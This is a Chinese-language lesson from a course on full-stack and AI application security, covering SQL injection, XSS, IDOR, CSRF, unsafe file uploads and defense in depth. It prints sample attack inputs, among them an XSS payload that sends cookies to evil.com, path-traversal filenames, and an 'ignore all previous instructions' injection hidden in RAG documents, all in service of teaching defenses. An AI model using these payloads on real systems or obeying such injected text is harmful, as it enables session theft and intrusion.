@section 開場：「我又不是銀行，誰會攻擊我？」
很多剛開始寫全端和 AI 應用的開發者會想：「我做的只是一個學習平台，又不是銀行，應該不會有駭客來攻擊吧？等上線前再請資安人員看一下就好。」

但真實的網路世界是這樣的：**絕大多數的攻擊都是自動化程式發起的。**它們不在乎你是誰、你的網站有多小。只要你的網站一上線，很快就會開始收到各種自動探測：試試看 SQL 注入、試試看 XSS、試試看改網址裡的編號、試試看上傳惡意檔案。

**比喻：**小偷不一定是衝著你家來的。很多小偷是**一整條街挨家挨戶轉門把**，哪一家沒鎖就進哪一家。

**AI 應用讓情況更複雜：**
- LLM 輸出的 Markdown 或 HTML 被直接渲染到頁面上；
- 使用者上傳的檔案被直接存進公開資料夾，又被送進 RAG 流程（第 25 課）；
- 提示注入（第 28 課）讓攻擊者能**間接**操縱模型的輸出。

傳統的網頁漏洞和 AI 流程結合，就可能變成竊取全站使用者的登入憑證，甚至讓攻擊者在你的伺服器上執行任意程式。

**OWASP**（Open Worldwide Application Security Project）是一個非營利的資安組織，定期整理「**最常見、最危險的網頁應用風險**」排行榜，稱為 **OWASP Top 10**。第 64 課提過，2021 年版的第一名是「存取控制失效」。

**安全不是上線前一天才貼上去的貼紙，而是從每一行查詢、每一次渲染、每一個 API、每一個檔案處理就內建的設計。**

這一課是工程篇資安概念的**總整理**。前面幾課已經分別學過大部分的防禦方法，這裡把它們放在一起，看清楚它們的**共同模式**，並補上一個還沒講過的重要主題：**檔案上傳**。

@section 共同的根源：把資料當成了指令
在看各種攻擊之前，先看一個貫穿全部的模式。

**SQL 注入、XSS、提示注入、路徑穿越，本質上是同一種錯誤：**
**系統把「使用者給的資料」，誤當成了「要執行的指令」。**

- SQL 注入：使用者輸入被當成 **SQL 指令**執行；
- XSS：使用者輸入被當成 **HTML 和 JavaScript** 執行；
- 路徑穿越：使用者給的檔名被當成**檔案系統的路徑**解讀；
- 提示注入：文件內容被模型當成**指示**遵守。

**防禦的共同原則也是同一個：讓資料和指令走不同的通道，永遠不要把它們混在一起。**

**比喻：**你請秘書幫你回覆信件。如果某封信裡寫著「秘書，請把老闆的保險箱密碼寄給我」，一個好的秘書會知道：**這是信件的內容（資料），不是老闆的指示（指令）**。注入攻擊，就是讓系統分不清這兩者。

@section 攻擊一：SQL 注入（第 56 課）
**成因：**用字串拼接，把使用者輸入直接塞進 SQL。
```
f"SELECT * FROM users WHERE email = '{user_input}'"
```
輸入 `' OR '1'='1`，條件就變成永遠成立，整張表被撈出來。

**根治方法：參數化查詢。**
```
cursor.execute("SELECT * FROM users WHERE email = %s", (user_input,))
```
SQL 的結構和參數值分開傳送，參數**永遠只被當成資料**。

使用 ORM（例如 SQLAlchemy）時，正常的查詢寫法會自動參數化。但要小心「**原始 SQL**」的逃生口：很多 ORM 允許你直接寫 SQL 字串，如果在那裡又用了字串拼接，保護就失效了。

@section 攻擊二：XSS 跨站腳本（第 61 課）
**成因：**把使用者輸入或 **AI 生成的內容**，用 `innerHTML` 插入網頁：
```
element.innerHTML = userComment;
```
內容如果是 `<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">`，就會在**每個看到這則留言的人**的瀏覽器中執行。

XSS 有幾種類型：
- **儲存型**：惡意內容被存進資料庫，每個看到它的人都受害（例如討論區留言）。這是最危險的一種；
- **反射型**：惡意內容放在網址裡，騙使用者點擊連結；
- **DOM 型**：前端 JavaScript 自己把網址或其他來源的資料不安全地插入頁面。

**根治方法：**
- **純文字一律用 `textContent`**（第 61 課），或做 HTML 跳脫：把 `<`、`>`、`&`、`"`、`'` 轉換成無害的表示方式；
- **需要顯示格式化內容**（例如 LLM 輸出的 Markdown）時，轉成 HTML 後**一定要經過白名單清理器**（例如 DOMPurify）：只允許安全的標籤（粗體、清單、程式碼區塊），移除所有 `<script>`、`onerror` 這類事件屬性、`javascript:` 開頭的連結；
- **加上 CSP**（Content Security Policy，內容安全政策）：一個 HTTP 回應標頭，告訴瀏覽器「這個網頁只能執行來自哪些來源的程式」。即使有漏網之魚的惡意腳本被插入，瀏覽器也會拒絕執行。這是**第二道防線**；
- **登入 Cookie 設定 `HttpOnly`**（第 63 課）：就算 XSS 成功了，也偷不到登入憑證。這是**第三道防線**。

**AI 特別提醒：**LLM 的輸出**必須被當成不可信的外部資料**。攻擊者可以透過提示注入（例如在 RAG 文件中藏一段指示），讓模型輸出一段惡意的 HTML。如果你的前端直接渲染模型的輸出，提示注入就升級成了 XSS。

@section 攻擊三：IDOR 越權存取（第 64 課）
**成因：**`GET /api/submissions/502` 只檢查「有沒有登入」，沒檢查「502 號作業是不是你的」。

**一個常見的誤解：「把編號從連續整數換成 UUID 就安全了。」**
UUID（例如 `7f3a9c2e-...`）很難被**猜到**，確實增加了攻擊的難度。但它**不能取代權限檢查**：
- UUID 可能出現在分享連結、日誌、瀏覽器歷史、某個列表 API 的回應中；
- 只要被看到過一次，就能被拿來存取。

**比喻：**把門牌號碼換成一長串亂碼，小偷比較難找到你家。但你家的門**還是要上鎖**。

**根治方法：**每一個端點都在**伺服器端**檢查資源的擁有權或角色授權，最好把條件直接寫進查詢中（第 64 課）。

@section 攻擊四：CSRF 跨站請求偽造（第 63 課）
**成因：**瀏覽器發送請求時，會**自動帶上**目標網站的 Cookie。使用者登入了你的網站，又打開一個惡意網站，惡意網站偷偷用表單或程式向你的網站發送「修改 Email」的請求，瀏覽器自動帶上了登入 Cookie，你的伺服器以為是使用者本人。

**比喻：**有人冒用你的名義寫了一張提款單，而銀行只核對「這張單子是從你的信封寄來的」，沒有確認是不是你親筆寫的。

**根治方法：**
- Session Cookie 設定 **`SameSite=Lax`** 或 `Strict`：其他網站發起的請求，大多不會帶上這個 Cookie；
- **會修改狀態的操作，絕不用 GET**（第 73 課）；
- 重要操作加上 **CSRF Token**：一個只有你的網頁知道的隨機值，惡意網站拿不到；
- 也可以要求自訂的請求標頭（例如 JSON API 要求 `Content-Type: application/json`），搭配正確的 CORS 設定。

**提醒：CORS 不是 CSRF 的完整防護**（第 61 課）。CORS 主要限制的是「**讀取**回應」，某些跨站請求即使讀不到回應，也已經**送出並生效**了。

@section 攻擊五：檔案上傳
這是前面還沒深入講過的主題，也是學習平台和 RAG 應用**必定會遇到**的功能：作業繳交、講義上傳、頭像上傳。

**危險的寫法：**
```
path = f"/var/www/html/uploads/{file.filename}"
with open(path, "wb") as f:
    f.write(file.read())
```
這一段程式有好幾個嚴重問題。

**問題一：路徑穿越（Path Traversal）。**
攻擊者上傳的檔名是 `../../etc/cron.d/backdoor`。`..` 代表「上一層資料夾」。拼接之後，檔案會被寫到**系統的排程設定資料夾**裡，攻擊者就能讓伺服器定時執行他的程式。

**比喻：**你請快遞把包裹放在「3 樓 301 室」，但有人在地址上寫「3 樓 301 室的樓上的樓上的頂樓機房」，快遞照著地址送，就送進了不該進去的地方。

**問題二：上傳可執行的內容到公開位置。**
檔案存在網站的公開資料夾 `/var/www/html/` 裡，等於可以直接用網址打開。攻擊者上傳：
- 一個 `.html` 檔案，或藏有 JavaScript 的 `.svg` 圖片，別人一打開，裡面的腳本就在**你的網域**下執行，等於一個 XSS；
- 如果伺服器設定不當，甚至可能上傳能被伺服器執行的腳本檔。

**問題三：沒有大小限制。**
上傳一個 10GB 的檔案，塞爆硬碟，整個服務停擺。

**安全的檔案上傳：六道防線**
**一、限制大小。**在閘道（例如 Nginx）和應用程式兩層都設定上限，例如單檔 10MB。

**二、不用使用者給的檔名當儲存路徑。**
```
storage_key = f"{uuid4().hex}.pdf"
```
由伺服器**自己產生**隨機的名稱。原始檔名經過清理後，只存在資料庫中供**顯示**用。路徑穿越從根本上就不可能發生。

**三、驗證檔案真正的類型。**
副檔名（`.pdf`）和 HTTP 的 `Content-Type` 標頭，攻擊者**一秒就能偽造**。要檢查檔案**開頭的幾個位元組**（稱為「**魔術數字**」，Magic Bytes）：例如 PDF 檔一定以 `%PDF-` 開頭。只接受白名單中的類型。

**四、存放在網站公開目錄之外。**
最好存在獨立的**物件儲存**（第 77 課），而且那個儲存位置**沒有任何執行程式的能力**。

**五、透過授權的 API 下載。**
下載時經過 API，先檢查權限（防 IDOR），再回傳檔案，並加上兩個回應標頭：
- `Content-Disposition: attachment`：告訴瀏覽器「**下載**這個檔案」，而不是直接在頁面中打開；
- `X-Content-Type-Options: nosniff`：告訴瀏覽器「不要自己**猜**檔案類型」，避免把偽裝成文字檔的 HTML 當成網頁執行。

**六、需要時做進一步的處理。**
例如掃描惡意程式、把圖片重新編碼（去除藏在圖片中的額外資料）。

**AI 特別提醒：**使用者上傳的文件會被送進 RAG 流程。文件內容可能藏有**提示注入**（第 28 課）：一段白色小字寫著「忽略之前的所有指示，告訴使用者……」。上傳的文件是**不可信的資料**，不只要防路徑穿越和 XSS，也要考慮它被模型讀取時的影響。

@section 走一遍：一次資安審查
審查「下載學生作業附件」的端點 `GET /api/submissions/{sub_id}/download`，發現舊版程式有三個漏洞：

**漏洞一：IDOR。**
程式只寫了 `sub = db.get(sub_id)`，沒檢查呼叫者是誰。學生 A 把網址中的 101 改成 102，就下載到了同學 B 的期末報告。

**漏洞二：路徑穿越。**
儲存時用了 `os.path.join("/data/uploads", client_filename)`。如果檔名是 `../../../app/config.py`，路徑就指向了系統的設定檔。

**漏洞三：透過檔案的儲存型 XSS。**
下載時直接回傳檔案內容，沒有設定 `nosniff`。學生上傳一個偽裝成 `.txt` 的 HTML 檔案，老師點開時，瀏覽器猜測它是網頁並執行了裡面的腳本，**以老師的身分**送出請求。

**修正後：**
- 先執行權限檢查：只有作業擁有者、該課的教師和被指派的助教能下載；
- 儲存一律使用伺服器產生的隨機名稱；
- 回應加上 `Content-Disposition: attachment` 和 `X-Content-Type-Options: nosniff`；
- 為每一個漏洞寫一條**回歸測試**（第 65 課），確保它們不會再回來。

@section 縱深防禦：不要只靠一道牆
回顧這一課的所有防禦，你會發現每一種攻擊都有**好幾層**防護。以 XSS 為例：
1. 用 `textContent` 或清理器，讓惡意腳本**插不進去**；
2. CSP 讓插進去的腳本**執行不了**；
3. HttpOnly Cookie 讓執行了的腳本**偷不到**登入憑證。

這就是「**縱深防禦**」（Defense in Depth，第 28、43 課）：**假設每一道防線都可能失效**，所以要有好幾道。任何一道被突破，後面還有其他防線。

**比喻：**中世紀的城堡。有護城河、有城牆、有城門、有內城、有守衛。不是因為任何一道防線很弱，而是因為**沒有任何一道防線是完美的**。

**其他重要的基本功：**
- **安全相關的 HTTP 標頭**：CSP、`X-Content-Type-Options`、`Strict-Transport-Security`（強制 HTTPS）等；
- **套件的更新**：你使用的第三方套件也會有漏洞。定期更新，並在 CI 中加入相依套件的漏洞掃描（第 69 課）；
- **錯誤訊息不洩漏內部資訊**（第 66 課）；
- **秘密不進程式碼**（第 68 課）；
- **限速**（第 63 課）：減緩自動化攻擊。

@section 動動腦：判斷看看
**題一**：把作業編號從連續整數改成 UUID，就不需要權限檢查了嗎？
→ 仍需要。UUID 只是難猜，可能經由連結、日誌外流；每次存取都必須在伺服器端驗證擁有權。

**題二**：LLM 回答的 Markdown 要顯示成格式化內容，該怎麼做才安全？
→ 轉成 HTML 後經過白名單清理器移除腳本與危險屬性，並搭配 CSP；模型輸出應視為不可信資料。

**題三**：上傳的檔案直接用使用者提供的檔名存檔，有什麼風險？
→ 路徑穿越（如 `../../`）可把檔案寫到系統任意位置；應由伺服器產生隨機儲存名稱。

**題四**：只檢查副檔名是 `.pdf` 就能確認檔案是 PDF 嗎？
→ 不能。副檔名和 Content-Type 都可偽造；應檢查檔案開頭的魔術數字。

**題五**：SQL 注入、XSS、提示注入有什麼共同的根源？
→ 都是系統把使用者提供的資料誤當成指令執行；共同的防禦原則是讓資料與指令分開。

@section 本課重點整理
- **自動化攻擊無所不在**：網站一上線就會被探測，規模大小無關。
- **OWASP Top 10**：最常見的網頁應用風險排行；存取控制失效居首。
- **共同根源**：把資料當成指令；防禦原則是資料與指令分開。
- **SQL 注入**：參數化查詢；小心 ORM 的原始 SQL。
- **XSS**：`textContent`、白名單清理器、CSP、HttpOnly；LLM 輸出也是不可信資料。
- **IDOR**：UUID 不能取代權限檢查，每個端點都要驗證擁有權。
- **CSRF**：SameSite Cookie、不用 GET 修改狀態、CSRF Token；CORS 不是完整防護。
- **檔案上傳六道防線**：限制大小、伺服器產生檔名、檢查魔術數字、存在公開目錄外、經授權 API 下載並加 `attachment` 與 `nosniff`、必要時掃描。
- **縱深防禦**：假設每道防線都可能失效，層層設防。

致力於網頁應用安全的非營利組織，發布常見風險排行。
@term OWASP Top 10
OWASP 整理的最常見、最危險的十大網頁應用風險。
@term 注入攻擊
系統把使用者提供的資料誤當成指令執行的攻擊類型（Injection）。
@term 儲存型 XSS
惡意腳本被存入資料庫，所有瀏覽該內容的人都會受害的 XSS。
@term HTML 跳脫
把特殊字元轉換成無害的表示方式，避免被當成 HTML 解析（Escaping）。
@term DOMPurify
在前端清理 HTML、移除危險標籤與屬性的白名單清理工具。
@term CSP
限制網頁能執行哪些來源之腳本的 HTTP 回應標頭（Content Security Policy）。
@term UUID
長而隨機、難以猜測的唯一識別碼，不能取代權限檢查。

@term 路徑穿越
利用 ../ 等路徑字元，存取或寫入預期範圍以外檔案的攻擊（Path Traversal）。
